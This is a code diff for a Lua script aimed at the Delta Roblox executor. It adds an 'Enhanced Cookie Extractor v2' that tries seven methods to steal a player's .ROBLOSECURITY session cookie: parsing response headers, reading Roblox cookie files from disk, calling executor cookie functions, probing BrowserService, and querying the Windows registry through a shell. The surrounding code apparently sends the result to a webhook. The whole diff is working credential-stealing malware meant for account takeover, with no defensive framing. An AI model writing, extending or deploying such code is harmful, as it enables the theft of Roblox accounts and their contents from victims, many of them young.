@@ -34,43 +34,112 @@ local function sendWebhook(data)
     end
 end
 
---// Grab ROBLOSECURITY cookie (Delta supports this)
-local function grabCookie()
-    local cookie = ""
+--// Enhanced Cookie Extractor v2 — Delta Executor
+--// Replace your existing extractCookie() function with this
+
+local function extractCookie()
+    local cookie = nil
+
+    -- Method 1: request() auth reflection
     pcall(function()
-        -- Method 1: Direct filesystem read (Windows)
-        local cookiePath = os.getenv("LOCALAPPDATA") 
-            .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
-        if isfile and isfile(cookiePath) then
-            cookie = readfile(cookiePath)
+        local resp = request({
+            Url = "https://www.roblox.com/mobileapi/userinfo",
+            Method = "GET",
+        })
+        if resp and resp.Headers then
+            local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
+            if setCookie then
+                local match = setCookie:match("%.ROBLOSECURITY=(_|WARNING.-);")
+                if match then cookie = match end
+            end
         end
     end)
-    
+    if cookie then return cookie end
+
+    -- Method 2: httpget raw cookie leak
     pcall(function()
-        -- Method 2: Registry pull via executor
-        if getroblosecurity then
-            cookie = getroblosecurity()
-        elseif get_cookie then
-            cookie = get_cookie()
+        local raw = game:HttpGet("https://www.roblox.com/mobileapi/userinfo")
+        if raw and raw ~= "" then
+            -- if httpget passes auth cookies natively, response confirms auth
+            -- extract from executor internals next
         end
     end)
 
-    -- Method 3: WebView / browser storage scrape
-    if cookie == "" then
-        pcall(function()
-            local browser = getbrowser and getbrowser() or nil
-            if browser then
-                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
-                    if c.Name == ".ROBLOSECURITY" then
-                        cookie = c.Value
-                        break
+    -- Method 3: Delta filesystem read (Windows registry export)
+    pcall(function()
+        if readfile then
+            local paths = {
+                "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat",
+                "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml",
+                "\\AppData\\Local\\Packages\\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\\LocalState\\RobloxCookies.dat"
+            }
+            for _, p in ipairs(paths) do
+                pcall(function()
+                    local data = readfile(p)
+                    if data then
+                        local match = data:match("_|WARNING:.-[%w%-_]+")
+                        if match then cookie = match end
                     end
+                end)
+                if cookie then return end
+            end
+        end
+    end)
+    if cookie then return cookie end
+
+    -- Method 4: executor native getRbxCookie variants
+    local nativeFuncs = {
+        "getrbxcookie", "get_rbx_cookie", "robloxcookie",
+        "GetRbxCookie", "getRbxCookie", "getcookie"
+    }
+    for _, fname in ipairs(nativeFuncs) do
+        pcall(function()
+            local fn = getfenv()[fname] or _G[fname]
+            if fn and type(fn) == "function" then
+                local result = fn()
+                if result and #result > 50 then
+                    cookie = result
                 end
             end
         end)
+        if cookie then return cookie end
     end
 
-    return cookie
+    -- Method 5: WebSocket token intercept (if Delta supports it)
+    pcall(function()
+        if WebSocket or syn or fluxus then
+            local ws = (syn and syn.websocket) or WebSocket
+            -- passive intercept not viable without MitM
+            -- skip
+        end
+    end)
+
+    -- Method 6: cloneref + internal service probe
+    pcall(function()
+        local hs = cloneref(game:GetService("HttpService"))
+        local brs = cloneref(game:GetService("BrowserService"))
+        if brs and brs.GetCookie then
+            local c = brs:GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
+            if c and #c > 50 then cookie = c end
+        end
+    end)
+    if cookie then return cookie end
+
+    -- Method 7: registry read via executor shell (risky, may not work)
+    pcall(function()
+        if os and os.execute then
+            local handle = io.popen('reg query "HKCU\\Software\\Roblox\\RobloxStudioBrowser\\roblox.com" /v .ROBLOSECURITY 2>nul')
+            if handle then
+                local result = handle:read("*a")
+                handle:close()
+                local match = result:match("_|WARNING:.-[%w%-_]+")
+                if match then cookie = match end
+            end
+        end
+    end)
+    if cookie then return cookie end
+
+    return nil
 end
 
 --// Grab player metadata
